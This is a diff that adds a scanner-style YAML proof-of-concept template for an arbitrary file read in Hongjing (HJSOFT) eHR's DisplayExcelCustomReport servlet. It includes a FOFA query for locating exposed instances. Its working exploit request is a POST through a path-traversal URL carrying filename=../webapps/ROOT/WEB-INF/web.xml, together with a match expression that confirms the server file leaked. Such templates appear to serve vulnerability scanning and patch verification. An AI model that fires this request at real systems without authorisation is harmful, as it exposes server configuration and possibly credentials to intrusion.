@@ -1,0 +1,18 @@
+id: poc-yaml-hjsoft-ehr-displayexcelcustomreport-anyfile-read
+info:
+  name: 宏景eHR DisplayExcelCustomReport 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: POST
+  path: /templates/attestation/../../servlet/DisplayExcelCustomReport
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filename=../webapps/ROOT/WEB-INF/web.xml
+  expression: status_code == 200 && contains(body,"</web-app>") && contains(body,"<?xml")
+    && contains(headers,"application/msexcel;charset=GBK") && contains(headers,"filename=web.xml")
+variables: {}
+transport: http
